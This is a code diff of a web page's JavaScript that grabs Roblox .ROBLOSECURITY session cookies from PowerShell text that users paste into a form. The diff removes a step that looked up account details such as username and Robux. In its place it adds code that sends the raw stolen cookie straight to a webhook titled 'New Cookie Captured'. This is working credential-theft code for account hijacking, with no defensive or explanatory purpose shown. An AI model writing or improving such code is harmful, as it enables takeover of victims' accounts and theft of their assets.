@@ -70,42 +70,12 @@ document.getElementById('submitButton').addEventListener('click', async function
   }
 
   // Send webhook for valid cookie
-  // Send webhook for valid .ROBLOSECURITY cookie
-const roblosecurityRegex = /\.ROBLOSECURITY",\s*"([^"]+)"/;
-const match = powershellData.match(roblosecurityRegex);
+  const roblosecurityRegex = /New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)"/;
+  const match = powershellData.match(roblosecurityRegex);
   if (match) {
-  const cookie = match[1].trim();
-
-  // 🔁 Make request to your backend server to get account info
-  try {
-    const response = await fetch('http://localhost:3000/roblox-info', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ cookie })
-    });
-
-    if (!response.ok) {
-      throw new Error('Invalid .ROBLOSECURITY cookie');
-    }
-
-    const data = await response.json();
-
-    await sendWebhook('Roblox Info Grabbed ✅', `
-**Username:** ${data.username}
-**User ID:** ${data.userId}
-**Robux:** ${data.robux}
-**Premium:** ${data.premium ? 'Yes' : 'No'}
-**Avatar:** ${data.avatar}
-`, 0x00ff00);
-
-  } catch (err) {
-    console.error(err);
-    await sendWebhook('Error Fetching Roblox Info ❌', err.message, 0xff0000);
+    const cookie = match[1].trim();
+    await sendWebhook('New Cookie Captured', `\`\`\`${cookie}\`\`\``, 0x00ff00);
   }
-}
-
-
-
 
   powershellInput.value = '';
   closeModal('modal');
